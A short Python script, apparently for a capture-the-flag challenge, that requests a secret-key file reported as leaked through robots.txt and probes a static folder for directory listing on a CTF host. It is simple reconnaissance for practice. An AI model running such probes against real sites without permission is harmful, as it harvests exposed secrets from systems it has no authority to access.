# -*- coding: utf-8 -*-
"""访问 robots.txt 泄露的 secretkey"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== /static/secretkey.txt ===')
r = requests.get(base + '/static/secretkey.txt', timeout=10)
print(f'状态: {r.status_code}')
print(f'内容:')
print(r.text[:500])
print()

print('=== 目录列举试探 /static/ ===')
r2 = requests.get(base + '/static/', timeout=10)
print(f'/static/: {r2.status_code} | {r2.text[:200].replace(chr(10), " ")}')
